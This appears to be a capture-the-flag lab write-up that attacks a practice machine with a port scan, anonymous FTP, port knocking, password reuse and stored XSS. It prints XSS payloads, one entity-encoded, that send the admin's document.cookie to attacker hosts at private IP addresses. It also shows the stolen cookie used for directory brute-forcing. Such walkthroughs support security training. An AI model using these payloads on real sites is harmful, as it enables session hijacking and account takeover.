first of all we run nmap to scan all ports:

	nmap -p- 10.10.10.179 

output:

	PORT   STATE SERVICE
	21/tcp open  ftp
	22/tcp open  ssh

there is open the ftp so I try to connect in anonymous:

	ftp anonymous@10.10.10.179

output:

	cd pub
	ls
	229 Entering Extended Passive Mode (|||45700|)
	150 Here comes the directory listing.
	-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
	-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
	-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng

I download all of them, inside a info there is a reference to pcap, in jokes.txt tell something about the port knocking and the pcap has the the port knocking sequence.
after some research by using wireshark I found it some ports and I will use a tool named "knock" to knock at them:

	knock 10.10.122.226 7864 8273 9241 12007 60753 

so:

	PORT     STATE SERVICE
	8080/tcp open  http-proxy

it seems it has a certificate so we go to the following url: https://10.10.122.226:8080, now it's time to do gobuster

	/login
	/dashboard 301, redirect to /login
	/console

/console seems untouchable  so we should do login, there is something interesting the x509 certificate, other machines that don't have it. so if we read the certificate's details we retrieve an email: emailAddress = zac@misguided_ghosts.thm.
The most commont thing to do is to use the same user and password so now we're in, in the main page there is a phrase:

	Create a post below; admins will check every two minutes so don't be rude.

it seems an hint to do XSS in order to steal admin's cookie first we run a python server: 

	python3 -m http.server 8000

then I tried a bunch of payloads like:

	1) <script>alert(1);</script> 
	2) <img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>	

but just one worked for me:

	&#X3c;SCRIPT&#X3e;var i=new Image;i.src="http://10.8.98.143:8000/?"+document.cookie;&#X3c;/SCRIPT&#X3e;

we're hayley, i want to search for other directories so I run gobuster with this command

	gobuster dir -u https://10.10.10.179:8080/dashboard/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt -t 30 -k -c hayley_is_admin

